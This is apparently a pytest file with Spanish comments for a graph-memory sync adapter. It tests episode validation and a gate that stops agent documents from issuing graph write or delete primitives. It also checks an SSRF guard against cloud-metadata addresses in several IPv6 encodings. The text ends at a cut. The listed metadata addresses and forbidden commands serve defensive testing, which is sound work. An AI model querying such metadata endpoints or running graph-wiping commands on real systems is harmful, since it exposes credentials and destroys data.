def test_ca04_backend_sin_datos_no_bloquea_la_lectura_enrutada(tmp_path):
    """CA-04: un backend vivo pero SIN datos no es un error — `verify` es `ok` y una consulta
    enrutada devuelve cero aciertos con motivo, nunca una excepcion."""
    root = str(tmp_path)
    with ServidorMCP(respuestas_tools={"search_nodes": {"structuredContent": {"result": {"nodes": []}}},
                                       "search_memory_facts": {"structuredContent": {"result": {"facts": []}}},
                                       "get_episodes": {"structuredContent": {"result": {"episodes": []}}}}) as srv:
        cfg = {"_root": root, "group_id": "proy-seguridad", "endpoint": srv.endpoint,
               "mode": "read", "allow_remote": False, "timeout_ms": 2000,
               "provider": {"llm": "ollama", "model": "m"}}
        veredicto = gr.verify(cfg)
        assert veredicto["ok"] is True, veredicto
        respuesta = gr.consultar(cfg, {"intent": "relacional", "texto": "grafo", "limit": 5})
    assert isinstance(respuesta, dict)
    assert respuesta.get("aciertos") == []


def _backends_con_proveedor_que_pierde_el_uuid(tmp_path):
    """Copia REAL de los modulos del adaptador con UNA sola mutacion, en el proveedor de verdad
    (`graphiti_providers._con_instrucciones_de_extraccion`, el que usa `ollama`): reconstruye el
    episodio y PIERDE el `uuid`. Es el bug que destapo el gap #154 -la validacion previa a
    `add_memory` miraba `name`/`episode_body`/`group_id` pero no `uuid`, asi que el episodio SALIA
    al grafo y el `KeyError` posterior mandaba la op a dead-letter: un episodio vivo en el grafo
    que el manifiesto no conoce y que `revoke` no puede invalidar-.

    La copia se carga con `--backends-dir` bajo un `type` propio (`graphiti-sinuuid`), porque el
    directorio real gana siempre para `type: graphiti`: asi el arbol del repo no se toca.
    Devuelve `(directorio, tipo)`."""
    destino = os.path.join(str(tmp_path), "backends-sin-uuid")
    os.makedirs(destino, exist_ok=True)
    for origen, nombre in (("graphiti.py", "graphiti_sinuuid.py"),
                           ("graphiti_providers.py", "graphiti_providers.py"),
                           ("graphiti_model.py", "graphiti_model.py")):
        shutil.copy2(os.path.join(KS_BACKENDS, origen), os.path.join(destino, nombre))
    ruta = os.path.join(destino, "graphiti_providers.py")
    texto = _texto(ruta)
    ancla = "    salida = dict(episodio)"    # sin el salto: el repo usa CRLF
    assert ancla in texto, "cambio `_con_instrucciones_de_extraccion`: la mutacion ya no aplica"
    _escribir(ruta, texto.replace(ancla, ancla + chr(10) + '    salida.pop("uuid", None)', 1))
    return destino, "graphiti-sinuuid"


def test_ca14_el_proveedor_real_que_pierde_el_uuid_no_gasta_add_memory_y_acaba_en_dead_letter(
        tmp_path, capsys):
    """Gap #154: con el proveedor REAL mutado para perder el `uuid`, `apply()` falla ANTES de
    `add_memory` (cero llamadas de escritura al grafo), el envelope acaba en `dead-letter/` con la
    causa y ni el manifiesto publicado ni el `.pending` registran la entrada: no queda ni un
    episodio huerfano que `revoke` no pueda invalidar."""
    root = str(tmp_path)
    dir_outbox = os.path.join(root, ".claude", "knowledge-services", "_sync-outbox", "graphiti")
    base_manifiesto = os.path.join(root, ".claude", "knowledge-services")
    backends, tipo = _backends_con_proveedor_que_pierde_el_uuid(tmp_path)
    argv = ["--backend", "graphiti", "--root", root, "--json", "--backends-dir", backends]
    with ServidorMCP() as srv:
        _proyecto_con_datos_excluidos(root, srv.endpoint, tipo=tipo)
        assert ks_sync.main(argv) == 1
        err = capsys.readouterr().err
        assert "estructura invalida" in err, err
        assert "uuid" in err, err
        for _ in range(2):                            # intentos 2 y 3 -> MAX_INTENTOS
            ob.reintentar_ahora(dir_outbox)
            ks_sync.main(argv)
            capsys.readouterr()
        # lo PRIMERO: el grafo no vio NADA (ni un `add_memory` con datos que el manifiesto no
        # podra referenciar)
        assert _add_memory(srv.llamadas) == [], _add_memory(srv.llamadas)
    muertos = _dead_letter(dir_outbox)
    causa_json = next((n for n in muertos if n.endswith(".causa.json")), None)
    assert causa_json, ("el envelope fallido nunca llego a dead-letter", muertos)
    with open(os.path.join(dir_outbox, "dead-letter", causa_json), encoding="utf-8") as f:
        causa = json.load(f)
    assert causa["intentos"] >= 3
    assert "uuid" in causa["causa"], causa["causa"]
    assert not os.path.isfile(os.path.join(base_manifiesto, "graphiti-manifest.json"))
    pendiente = os.path.join(base_manifiesto, "graphiti-manifest.pending.json")
    if os.path.isfile(pendiente):                     # se escribe vacio ANTES de la primera op
        with open(pendiente, encoding="utf-8") as f:
            assert json.load(f).get("entradas") == {}, "el `.pending` registro un episodio que el grafo no tiene"


# ------------------------------------------ fix2 Fase 4: identidad y campos perdidos (#174/#180)

def _proveedor_que_muta(campo, valor):
    """Proveedor doble que devuelve el episodio construido con UN campo cambiado (o vaciado)."""
    def _proveedor(_config, episodio):
        salida = dict(episodio)
        salida[campo] = valor
        return salida
    return _proveedor


_MUTACIONES_DEL_PROVEEDOR = (
    # (campo, valor, texto que el rechazo debe citar) -- identidad alterada (mutante N3)
    ("group_id", "otro-proyecto", "identidad alterada: ['group_id']"),
    ("uuid", "00000000-0000-0000-0000-000000000000", "identidad alterada: ['uuid']"),
    ("name", "otra-entrada@1", "identidad alterada: ['name']"),
    # campos que `_episodio_upsert` construyo y el proveedor vacia (mutante N4)
    ("category", "", "episodio construido: ['category']"),
    ("entity_type", "", "episodio construido: ['entity_type']"),
    ("hash_enviado", "", "episodio construido: ['hash_enviado']"),
    # vacio de verdad, no solo `None` (mutante N5)
    ("episode_body", "   ", "vacios: ['episode_body']"),
    ("name", "", "vacios: ['name']"),
)


def test_f4fix2_un_proveedor_que_altera_la_identidad_o_pierde_campos_no_llega_a_add_memory(
        tmp_path, monkeypatch):
    """Gaps #174 y #180: de las comprobaciones que fix1 puso antes de `add_memory`, solo `uuid`
    ausente tenia test. Un proveedor que re-identifica el episodio (`group_id`/`uuid`/`name`
    distintos: escritura cruzada o pisado de otro episodio) o que VACIA un campo construido
    (`category`/`entity_type`/`hash_enviado`, `episode_body="   "`) cae con `ErrorMCP` y cero
    `add_memory`. Mutantes que mueren aqui: N3 `_CAMPOS_EPISODIO_IDENTIDAD = ()`, N4
    `perdidos = []` y N5 `_vacio_para_add_memory -> valor is None`."""
    for indice, (campo, valor, cita) in enumerate(_MUTACIONES_DEL_PROVEEDOR):
        with ServidorMCP() as srv:
            monkeypatch.setitem(gr._gp.PROVEEDORES, "ollama", _proveedor_que_muta(campo, valor))
            cfg = {"_root": os.path.join(str(tmp_path), "caso-%d" % indice),
                   "group_id": "proy-seguridad", "endpoint": srv.endpoint, "allow_remote": False,
                   "timeout_ms": 2000, "provider": {"llm": "ollama", "model": "qwen2.5:7b"}}
            ops = gr.plan([_apoyo_mcp._entrada()], cfg)
            assert ops, "sin operaciones no habria nada que probar"
            fallo = None
            try:
                gr.apply(ops, cfg)
            except gr.ErrorMCP as e:
                fallo = e
            assert _add_memory(srv.llamadas) == [], (campo, valor)
        assert fallo is not None, ("el proveedor que muta `%s` paso la validacion" % campo, valor)
        assert cita in str(fallo), (campo, valor, str(fallo))
        assert not os.path.isfile(gr._manifest_path(cfg)), (campo, valor)


def test_f4fix2_la_validacion_exige_source_y_source_description_aunque_no_haya_base():
    """Gap #180, mutante N1: `source`/`source_description` fuera de
    `_CAMPOS_EPISODIO_OBLIGATORIOS`. Con un episodio construido que SI los trae, el chequeo de
    «perdidos» lo tapa; sin base contra la que comparar, solo lo ve la lista de obligatorios."""
    completo = {"uuid": "u-1", "name": "x@1", "episode_body": "b", "group_id": "g",
                "source": "text", "source_description": "custom-agents:graphiti-memory"}
    gr._validar_episodio_del_proveedor(dict(completo), {})          # el completo pasa
    for campo in ("source", "source_description"):
        episodio = dict(completo)
        del episodio[campo]
        try:
            gr._validar_episodio_del_proveedor(episodio, {})
            raise AssertionError("un episodio sin `%s` paso la validacion (mutante N1)" % campo)
        except gr.ErrorMCP as e:
            assert "vacios: ['%s']" % campo in str(e), str(e)


def test_f4fix2_vacio_es_tambien_la_cadena_vacia_o_en_blanco():
    """Gap #180, mutante N5: `_vacio_para_add_memory` reducido a `valor is None` deja pasar
    `name=""` y `uuid="   "` cuando no hay base contra la que comparar la identidad."""
    assert gr._vacio_para_add_memory(None) and gr._vacio_para_add_memory("")
    assert gr._vacio_para_add_memory("   ") and not gr._vacio_para_add_memory("x")
    for campo, valor in (("name", ""), ("uuid", "   ")):
        episodio = {"uuid": "u-1", "name": "x@1", "episode_body": "b", "group_id": "g",
                    "source": "text", "source_description": "d", campo: valor}
        try:
            gr._validar_episodio_del_proveedor(episodio, {})
            raise AssertionError("`%s=%r` paso la validacion (mutante N5)" % (campo, valor))
        except gr.ErrorMCP as e:
            assert "vacios: ['%s']" % campo in str(e), str(e)


# ================================ 4. CA-05: ninguna pieza escribe en el grafo por su cuenta

# La skill DUEÑA (el sincronizador y su documentacion) es la unica que puede describir la
# escritura: el invariante es que NADIE MAS la invoque. Gap #179 (Minor, fix2 Fase 4): la exencion
# era por PREFIJO (`skills/knowledge-services/`), asi que cualquier `references/*.md` de la skill
# -que se inyecta en el contexto de un agente igual que su `SKILL.md`- quedaba sin puerta. Ahora es
# NOMINAL, fichero a fichero, y cada entrada dice por que:
#   - `backends/README.md` documenta el CONTRATO de las tools del adaptador (`add_memory`,
#     `add_triplet`...): es la doc del adaptador, no una instruccion a un agente.
#   - `SKILL.md` es estricta para las primitivas, pero documenta la publicacion POR EL
#     SINCRONIZADOR (`knowledge-sync.py --backend <id>`), que es justo el camino permitido.
#   - `references/kwipu-adapter.md` documenta la publicacion del backend `kwipu` (export Markdown,
#     no el grafo): exenta SOLO para `--backend kwipu`; cualquier otro backend en ella es FALLO.
# El resto de `references/*.md` no esta exento.
PIEZAS_EXENTAS_DE_PRIMITIVAS = ("skills/knowledge-services/backends/README.md",)
# pieza -> backends que puede publicar (`None` = la documentacion del propio sincronizador)
PIEZAS_EXENTAS_DE_SINCRONIZADOR = {
    "skills/knowledge-services/SKILL.md": None,
    "skills/knowledge-services/backends/README.md": None,
    "skills/knowledge-services/references/kwipu-adapter.md": ("kwipu",),
}


def _backend_de(texto):
    tokens = _tokens(texto)
    return tokens[tokens.index("--backend") + 1] if "--backend" in tokens[:-1] else None


def _exenta(etiqueta, texto):
    if etiqueta not in PIEZAS_EXENTAS_DE_SINCRONIZADOR:
        return False
    permitidos = PIEZAS_EXENTAS_DE_SINCRONIZADOR[etiqueta]
    return permitidos is None or _backend_de(texto) in permitidos
_PRIMITIVAS_ESCRITURA = ("add_memory", "add_triplet", "clear_graph", "delete_episode",
                         "delete_entity_edge", "delete_group")
_FLAGS_SOLO_LECTURA = ("--check", "--dry-run", "--outbox-status", "--propose-config")
# Gap #157: `--check` NO blanquea una linea que ademas publica; y una publicacion no siempre se
# escribe con `--backend <id>` a secas (`apply`/`revoke` son subcomandos del mismo camino).
_TOKENS_DE_ESCRITURA = ("apply", "revoke", "--rebuild")
_DIRECTORIOS_NO_PIEZA = {"tests", "fixtures", "__pycache__", "node_modules", ".git"}


def _piezas(root=ROOT):
    """Piezas que se INYECTAN en el contexto de un agente (etiqueta relativa -> ruta):
    `agents/*.md`, `commands/*.md` y TODO `.md` bajo `skills/` y `agent-kits/` (gap #157: un
    `references/*.md` o un fragmento de `agent-kits/shared/` instruye igual que una `SKILL.md`, y
    quedaban fuera del recorrido). Se excluyen tests y fixtures, que no instruyen a nadie."""
    piezas = {}
    for carpeta in ("agents", "commands"):
        base = os.path.join(root, carpeta)
        if not os.path.isdir(base):
            continue
        for nombre in sorted(os.listdir(base)):
            if nombre.endswith(".md"):
                piezas[carpeta + "/" + nombre] = os.path.join(base, nombre)
    for carpeta in ("skills", "agent-kits"):
        base = os.path.join(root, carpeta)
        if not os.path.isdir(base):
            continue
        for directorio, subdirs, ficheros in os.walk(base):
            subdirs[:] = sorted(d for d in subdirs if d not in _DIRECTORIOS_NO_PIEZA)
            for nombre in sorted(ficheros):
                if not nombre.endswith(".md") or nombre.startswith("test_"):
                    continue
                ruta = os.path.join(directorio, nombre)
                piezas[os.path.relpath(ruta, root).replace(os.sep, "/")] = ruta
    return piezas


def _tokens(linea):
    """Tokens de una linea de instrucciones: se sueltan comillas, backticks y parentesis, asi que
    `python3 "$KS/knowledge-sync.py" --backend graphiti` da los mismos tokens que la forma sin
    entrecomillar (gap #157: el literal `knowledge-sync.py --backend` exigia que las dos palabras
    fueran CONTIGUAS, y la regla 5 del repo obliga justo a lo contrario)."""
    return [t for t in re.split(r"""[\s`"'()<>,]+""", linea.strip()) if t]


_INTERPRETES = ("python", "python3", "py", "bash", "sh", "$")
_SPAN_DE_CODIGO_RE = re.compile(r"`([^`]+)`")


def _variable_en_codigo(linea, en_codigo):
    """Gap #181 (Minor, fix2 Fase 4): un token `$…` solo cuenta como la RUTA del sincronizador si
    va en codigo -bloque con valla, linea que arranca por el interprete, o un span de codigo que
    lleve tambien el `--backend`-. En prosa (`la ruta vive en $KS`) no es una invocacion."""
    if en_codigo or (_tokens(linea)[:1] and _tokens(linea)[0].lower() in _INTERPRETES):
        return any(t.startswith("$") for t in _tokens(linea))
    for span in _SPAN_DE_CODIGO_RE.findall(linea):
        tokens = _tokens(span)
        if "--backend" in tokens and any(t.startswith("$") for t in tokens):
            return True
    return False


def _invocacion_de_escritura(linea, en_codigo=False):
    """Motivo por el que la linea (logica) es una ESCRITURA en el grafo, o `None`. Reconoce la
    invocacion con la ruta entrecomillada o en variable (`"$KSSKILL"`, en codigo) y los flags en
    cualquier orden; el `--check` solo exime si en la MISMA unidad no hay
    `apply`/`revoke`/`--rebuild`."""
    tokens = _tokens(linea)
    if "--backend" not in tokens:
        return None
    cita_script = any(t.endswith("knowledge-sync.py") for t in tokens)
    if not (cita_script or _variable_en_codigo(linea, en_codigo)):
        return None
    escritura = [t for t in tokens if t in _TOKENS_DE_ESCRITURA]
    lectura = [t for t in tokens if t in _FLAGS_SOLO_LECTURA]
    if escritura:
        return "publica en el grafo (%s) aunque la linea traiga %s" % (
            ", ".join(escritura), lectura or "ningun flag de solo lectura")
    if not lectura:
        return "invoca `--backend` sin ningun flag de solo lectura"
    return None


def _unidades(texto):
    """Gap #175 (Important, fix2 Fase 4): la puerta era LINEA A LINEA, y la invocacion multilinea
    natural de un bloque bash (`python3 "$KS/knowledge-sync.py" \\` + `--backend graphiti apply`)
    la evadia. Devuelve `[(linea_inicial, texto, en_codigo, es_bloque)]`: cada linea LOGICA (las
    continuaciones con barra invertida final se unen) y, ademas, cada bloque con valla completo
    como una unidad (`es_bloque` = linea de la valla de cierre; `False` en las lineas), para la
    escritura partida en lineas sin continuacion."""
    unidades, acumulada, bloque = [], None, None
    for numero, linea in enumerate(texto.replace(chr(13), "").split(chr(10)), 1):
        if linea.strip().startswith(("```", "~~~")):
            if acumulada:
                unidades.append((acumulada[0], acumulada[1], bloque is not None, False))
                acumulada = None
            if bloque is None:
                bloque = (numero, [])
            else:
                unidades.append((bloque[0], " ".join(bloque[1]), True, numero))
                bloque = None
            continue
        if bloque is not None:
            bloque[1].append(linea)
        pieza = linea.strip() if acumulada else linea
        acumulada = (acumulada[0], acumulada[1] + " " + pieza) if acumulada else (numero, pieza)
        if linea.rstrip().endswith(chr(92)):
            acumulada = (acumulada[0], acumulada[1].rstrip()[:-1])
            continue
        unidades.append((acumulada[0], acumulada[1], bloque is not None, False))
        acumulada = None
    if acumulada:
        unidades.append((acumulada[0], acumulada[1], bloque is not None, False))
    if bloque is not None:                # valla sin cerrar: el resto del fichero es el bloque
        unidades.append((bloque[0], " ".join(bloque[1]), True, numero + 1))
    return unidades


def _ofensores_de_primitivas(root=ROOT):
    ofensores = []
    for etiqueta, ruta in sorted(_piezas(root).items()):
        if etiqueta in PIEZAS_EXENTAS_DE_PRIMITIVAS:
            continue                      # doc del contrato del adaptador (exencion NOMINAL)
        texto = _texto(ruta)
        for primitiva in _PRIMITIVAS_ESCRITURA:
            if primitiva in texto:
                ofensores.append((etiqueta, primitiva))
    return ofensores


def _ofensores_de_sincronizador(root=ROOT):
    ofensores = []
    for etiqueta, ruta in sorted(_piezas(root).items()):
        propios, lineas_ofensoras = [], set()
        for numero, texto, en_codigo, es_bloque in _unidades(_texto(ruta)):
            if es_bloque:
                continue
            motivo = _invocacion_de_escritura(texto, en_codigo)
            if motivo and not _exenta(etiqueta, texto):   # exencion NOMINAL (gap #179)
                propios.append((etiqueta, numero, motivo, texto.strip()[:120]))
                lineas_ofensoras.add(numero)
        for numero, texto, _en_codigo, es_bloque in _unidades(_texto(ruta)):
            if not es_bloque:
                continue
            motivo = _invocacion_de_escritura(texto, True)
            ya_visto = any(numero < n < es_bloque for n in lineas_ofensoras)
            if motivo and motivo.startswith("publica") and not ya_visto                     and not _exenta(etiqueta, texto):
                propios.append((etiqueta, numero, "bloque: " + motivo, texto.strip()[:120]))
        ofensores += propios
    return ofensores


def test_el_recorrido_de_piezas_no_esta_vacio():
    """Andamiaje: sin piezas, los dos tests de abajo pasarian en vacio. Gap #157: exige tambien
    las piezas que se inyectan sin ser `SKILL.md` (referencias y fragmentos compartidos)."""
    piezas = _piezas()
    for esperada in ("agents/knowledge-curator.md", "commands/dev-cycle.md",
                     "skills/knowledge-services/SKILL.md",
                     "skills/adversarial-review/references/lens-prompts.md",
                     "agent-kits/shared/knowledge-check.md"):
        assert esperada in piezas, (esperada, len(piezas))
    assert len(piezas) >= 100, len(piezas)


def test_ca05_ninguna_pieza_invoca_primitivas_de_escritura_en_el_grafo():
    """CA-05: solo el sincronizador escribe. Ninguna pieza (agente, comando, skill, referencia o
    fragmento compartido), incluida la `SKILL.md` duena, manda
    `add_memory`/`add_triplet`/`clear_graph`/`delete_*` por su cuenta."""
    assert _ofensores_de_primitivas() == [], _ofensores_de_primitivas()


def test_ca05_ninguna_pieza_ajena_invoca_el_sincronizador_en_modo_escritura():
    """Fuera de la skill `knowledge-services`, una pieza puede NOMBRAR `knowledge-sync.py`, pero
    solo en un modo de SOLO LECTURA (`--check`/`--dry-run`/`--outbox-status`/`--propose-config`):
    una publicacion real (`--backend <id>` a secas, `apply`, `revoke` o `--rebuild`) es escritura
    en el grafo, este la ruta entrecomillada, en variable o con los flags en otro orden."""
    assert _ofensores_de_sincronizador() == [], _ofensores_de_sincronizador()


# ----------------------------------------------------- mutantes de la puerta CA-05 (gap #157)
# Los cinco sobre un repo MINIMO en `tmp_path`: tres formas de invocacion que el literal anterior
# no veia y dos piezas inyectadas que no estaban en el recorrido.

def _repo_de_piezas(tmp_path, piezas):
    """Repo de mentira con las piezas indicadas (`{ruta relativa: contenido}`)."""
    root = os.path.join(str(tmp_path), "repo-piezas")
    for rel, contenido in piezas.items():
        _escribir(os.path.join(root, *rel.split("/")), contenido)
    return root


_MUTANTES_INVOCACION = (
    ("ruta entrecomillada (regla 5)",
     'python3 "$KS/knowledge-sync.py" --backend graphiti --root .'),
    ("flags reordenados",
     "python3 skills/knowledge-services/scripts/knowledge-sync.py --rebuild --backend graphiti"),
    ("`--check` y despues, sin --check, publica",
     "primero `knowledge-sync.py --backend graphiti --check` y despues "
     "`knowledge-sync.py --backend graphiti apply`"),
    ("ruta en variable, estilo de la SKILL.md",
     'python3 "$KSSKILL" --backend graphiti --root .'),
)


def test_mutantes_de_invocacion_del_sincronizador_no_pasan_la_puerta(tmp_path):
    """Mutantes 1-4 del gap #157: cuatro formas REALES de publicar en el grafo desde una pieza
    ajena que el literal `knowledge-sync.py --backend` + «hay un `--check` en la linea» dejaba
    pasar (los tres primeros sobrevivian en la revision)."""
    for descripcion, linea in _MUTANTES_INVOCACION:
        root = _repo_de_piezas(tmp_path, {"commands/dev-cycle.md":
                                          "# dev-cycle\n\n" + linea + "\n"})
        ofensores = _ofensores_de_sincronizador(root)
        assert ofensores, ("el mutante sobrevive: " + descripcion, linea)


def test_una_linea_de_solo_lectura_sigue_siendo_legitima(tmp_path):
    """Control negativo del mutante anterior: la puerta no puede volverse un «cualquier mencion a
    `--backend` es escritura» (eso romperia `/doctor`, que documenta el `--check`)."""
    root = _repo_de_piezas(tmp_path, {"commands/doctor.md":
                                      "python skills/knowledge-services/scripts/knowledge-sync.py "
                                      "--backend <id> --check\n"})
    assert _ofensores_de_sincronizador(root) == [], _ofensores_de_sincronizador(root)


def test_mutante_primitivas_en_una_pieza_inyectada_que_no_es_skill_md(tmp_path):
    """Mutante 5 del gap #157: `add_memory`/`clear_graph` en una referencia de skill y una
    publicacion en un fragmento de `agent-kits/shared/` -dos piezas que se inyectan igual que una
    `SKILL.md` y que el recorrido anterior (`agents/*.md` + `commands/*.md` + `skills/*/SKILL.md`)
    no miraba: 3 tests verdes-."""
    root = _repo_de_piezas(tmp_path, {
        "skills/adversarial-review/references/lens-prompts.md":
            "Lente C: manda `add_memory` y luego `clear_graph` para limpiar.\n",
        "agent-kits/shared/knowledge-check.md":
            'Publica con `python3 "$KS/knowledge-sync.py" --backend graphiti apply`.\n'})
    primitivas = _ofensores_de_primitivas(root)
    assert [e for e, _p in primitivas if "lens-prompts" in e], primitivas
    assert _ofensores_de_sincronizador(root), "la publicacion en `agent-kits/shared/` sobrevive"


# ------------------------------------------- mutantes de la puerta CA-05 (fix2 Fase 4)

def test_f4fix2_probe_p6_y_p4_la_invocacion_multilinea_no_evade_la_puerta(tmp_path):
    """Gap #175, probes P6 y P4: la forma NATURAL de un bloque bash (continuaciones con barra
    invertida) partia la invocacion en lineas que, sueltas, no casaban (2 passed). Las
    continuaciones se unen y el bloque de codigo cuenta ademas como una unidad."""
    formas = (
        ("p6", 'python3 "$KSSKILL/knowledge-sync.py" \\\n    --backend graphiti apply\n'),
        ("p4", 'python3 "$KS/knowledge-sync.py" \\\n  --backend graphiti \\\n  --root .\n'),
        ("rebuild", "python3 skills/knowledge-services/scripts/knowledge-sync.py \\\n"
                    "  --backend graphiti \\\n  --rebuild\n"),
    )
    for clave, comando in formas:
        for valla in ("```bash\n", "```sh\n", "```\n"):
            root = _repo_de_piezas(tmp_path / (clave + str(len(valla))),
                                   {"commands/dev-cycle.md":
                                    "# dev-cycle\n\n" + valla + comando + "```\n"})
            assert _ofensores_de_sincronizador(root), ("el probe sobrevive", clave, valla)
    # y sin valla: la continuacion se une igual en prosa indentada
    root = _repo_de_piezas(tmp_path / "suelta", {"commands/dev-cycle.md": formas[0][1]})
    assert _ofensores_de_sincronizador(root), "la continuacion fuera de bloque sobrevive"


def test_f4fix2_un_bloque_que_parte_la_publicacion_en_dos_lineas_es_una_unidad(tmp_path):
    """Gap #175 (bloque como unidad): dentro de un bloque ```bash```, la escritura en una linea
    y la invocacion en la anterior -sin barra- se leen juntas."""
    bloque = ('```bash\nKS_ARGS="--backend graphiti"\n'
              'python3 "$KS/knowledge-sync.py" $KS_ARGS apply\n```\n')
    root = _repo_de_piezas(tmp_path, {"commands/dev-cycle.md": bloque})
    assert _ofensores_de_sincronizador(root), "el bloque partido sobrevive"


def test_f4fix2_una_invocacion_multilinea_de_solo_lectura_sigue_siendo_legitima(tmp_path):
    """Control negativo del #175: el `--check` partido en continuaciones no es escritura."""
    root = _repo_de_piezas(tmp_path, {"commands/doctor.md":
                                      '```bash\npython3 "$KS/knowledge-sync.py" \\\n'
                                      '  --backend graphiti \\\n  --check\n```\n'})
    assert _ofensores_de_sincronizador(root) == [], _ofensores_de_sincronizador(root)


def test_f4fix2_probe_p3_una_variable_en_prosa_no_es_una_invocacion(tmp_path):
    """Gap #181, probe P3: una linea de PROSA que menciona `--backend` y cita `$KS` rompia la
    suite. Una variable solo cuenta como la ruta del sincronizador si es `$…/…knowledge-sync.py`
    o si va en codigo (bloque, span de codigo con el `--backend`, o linea que arranca con el
    interprete); en codigo, la forma variable SI se sigue viendo."""
    prosa = ("El flag `--backend` elige el adaptador; la ruta de la skill vive en $KS y se "
             "resuelve en runtime.\n")
    root = _repo_de_piezas(tmp_path / "prosa", {"commands/dev-cycle.md": prosa})
    assert _ofensores_de_sincronizador(root) == [], _ofensores_de_sincronizador(root)
    for clave, texto in (("bloque", '```bash\npython3 "$KSSKILL" --backend graphiti --root .\n```\n'),
                         ("span", 'Publica con `"$KSSKILL" --backend graphiti` a mano.\n'),
                         ("interprete", 'python3 "$KSSKILL" --backend graphiti --root .\n')):
        root = _repo_de_piezas(tmp_path / clave, {"commands/dev-cycle.md": texto})
        assert _ofensores_de_sincronizador(root), "la forma variable en %s sobrevive" % clave


def test_f4fix2_las_references_de_la_skill_duena_no_estan_exentas_por_prefijo(tmp_path):
    """Gap #179: la exencion era por PREFIJO (`skills/knowledge-services/`), asi que una
    `references/*.md` de la skill -que se inyecta igual que su `SKILL.md`- podia mandar
    `clear_graph` o publicar sin que la puerta lo viera. Ahora la exencion es NOMINAL."""
    root = _repo_de_piezas(tmp_path, {
        "skills/knowledge-services/references/kwipu-adapter.md":
            "Limpia con `clear_graph` y reescribe con `add_memory`.\n\n"
            "```bash\npython3 \"$KS/knowledge-sync.py\" --backend graphiti apply\n```\n",
        "skills/knowledge-services/backends/README.md": "La tool `add_memory` recibe ...\n"})
    primitivas = _ofensores_de_primitivas(root)
    assert [e for e, _p in primitivas if e.endswith("kwipu-adapter.md")], primitivas
    assert not [e for e, _p in primitivas if e.endswith("backends/README.md")], primitivas
    sincronizador = _ofensores_de_sincronizador(root)
    assert [o for o in sincronizador if o[0].endswith("kwipu-adapter.md")], sincronizador
    for pieza in PIEZAS_EXENTAS_DE_PRIMITIVAS + tuple(PIEZAS_EXENTAS_DE_SINCRONIZADOR):
        assert not pieza.endswith("/"), pieza                         # nombres, no prefijos
        assert os.path.isfile(os.path.join(ROOT, pieza)), pieza
    # la referencia de kwipu SI puede documentar su propia publicacion, y solo esa
    root = _repo_de_piezas(tmp_path / "kwipu", {
        "skills/knowledge-services/references/kwipu-adapter.md":
            'python3 "$KSSKILL" --backend kwipu --root <proyecto>' + chr(10)})
    assert _ofensores_de_sincronizador(root) == [], _ofensores_de_sincronizador(root)


def test_e18_ningun_agente_normal_cita_el_backend_graphiti():
    """Puerta E18 de `docs/agents/CONTRACTS.md`, literal: `grep -rn -i graphiti agents/*.md |
    grep -v knowledge-curator.md` -> vacio. `knowledge-curator.md` es la UNICA excepcion declarada
    (documenta la PROHIBICION de escribir en el grafo, no una capacidad)."""
    base = os.path.join(ROOT, "agents")
    citas = []
    for nombre in sorted(os.listdir(base)):
        if not nombre.endswith(".md") or nombre == "knowledge-curator.md":
            continue
        for numero, linea in enumerate(_texto(os.path.join(base, nombre)).splitlines(), 1):
            if "graphiti" in linea.lower():
                citas.append(("agents/" + nombre, numero, linea.strip()[:100]))
    assert citas == [], citas
    curador = _texto(os.path.join(base, "knowledge-curator.md"))
    assert "No exportas" in curador and "CONTRACTS.md` E18" in curador



# ============================ 5. guardarrail de red del cliente MCP (regresion del repo)

# IMDS de nube en sus cuatro formas (gaps #34c/#53/#71 de las Fases 2-3), direcciones sin sentido
# como destino y un host publico: ninguna puede conectar, con `allow_remote` o sin el.
_IMDS = (
    ("http://169.254.169.254/mcp", "IPv4 link-local (IMDS)"),
    ("http://[::ffff:169.254.169.254]:80/mcp", "IPv4-mapeada en IPv6 (gap #53)"),
    ("http://[2002:a9fe:a9fe::1]:80/mcp", "6to4 hacia 169.254.169.254 (gap #71)"),
    ("http://[2001:0:4136:e378:8000:63bf:3fff:fdd2]:80/mcp", "Teredo (gap #71)"),
)
_SIN_SENTIDO = (("http://0.0.0.0:8000/mcp", "no especificada IPv4"),
                ("http://[::]:8000/mcp", "no especificada IPv6"))


class _EspiaConexiones:
    """Registra CADA `socket.create_connection` (por donde salen `urllib`/`http.client`) para
    poder afirmar que no hubo ni un `connect()` fuera de loopback."""

    def __init__(self, monkeypatch):
        self.destinos = []
        original = socket.create_connection

        def _espia(direccion, *a, **k):
            self.destinos.append(direccion)
            return original(direccion, *a, **k)

        monkeypatch.setattr(socket, "create_connection", _espia)

    @property
    def fuera_de_loopback(self):
        return [d for d in self.destinos if str(d[0]) not in ("127.0.0.1", "::1", "localhost")]


def test_imds_se_rechaza_siempre_incluso_con_allow_remote(monkeypatch):
    """CWE-918: el endpoint de metadatos de nube se rechaza en sus cuatro formas, con
    `allow_remote: false` Y con `true` (`allow_remote` autoriza redes remotas, nunca la red de
    metadatos del propio host)."""
    espia = _EspiaConexiones(monkeypatch)
    for url, motivo in _IMDS:
        for allow_remote in (False, True):
            assert gr._host_permitido(url, allow_remote) is False, (url, motivo, allow_remote)
            cliente = gr.ClienteMCP(url, timeout_s=1.0, allow_remote=allow_remote)
            try:
                cliente.initialize()
                raise AssertionError("conecto contra %s (%s)" % (url, motivo))
            except gr.HostNoPermitido:
                pass
    assert espia.destinos == []          # ni un connect(): se rechaza ANTES de tocar la red


def test_direcciones_sin_sentido_como_destino_se_rechazan(monkeypatch):
    espia = _EspiaConexiones(monkeypatch)
    for url, motivo in _SIN_SENTIDO:
        for allow_remote in (False, True):
            assert gr._host_permitido(url, allow_remote) is False, (url, motivo, allow_remote)
    assert espia.destinos == []


def test_host_publico_sin_allow_remote_se_rechaza_antes_de_conectar(monkeypatch):
    """Invariante local/privado del repo: sin `allow_remote: true` declarado, un host publico no
    se intenta siquiera."""
    espia = _EspiaConexiones(monkeypatch)
    for url in ("http://8.8.8.8:8000/mcp", "https://1.1.1.1/mcp", "http://93.184.216.34/mcp"):
        assert gr._host_permitido(url, False) is False, url
        cliente = gr.ClienteMCP(url, timeout_s=1.0, allow_remote=False)
        try:
            cliente.initialize()
            raise AssertionError("conecto contra %s sin allow_remote" % url)
        except gr.HostNoPermitido:
            pass
    assert espia.destinos == []


class _ServidorEfimero:
    """Servidor HTTP propio en `127.0.0.1:0` (nunca fuera de loopback). `responder(handler)` decide
    la respuesta de cada POST; `peticiones` guarda `(ruta, cabeceras, cuerpo)`."""

    def __init__(self, responder):
        self.peticiones = []
        duenno = self

        class Handler(BaseHTTPRequestHandler):
            def do_POST(self):          # noqa: N802 - nombre impuesto por BaseHTTPRequestHandler
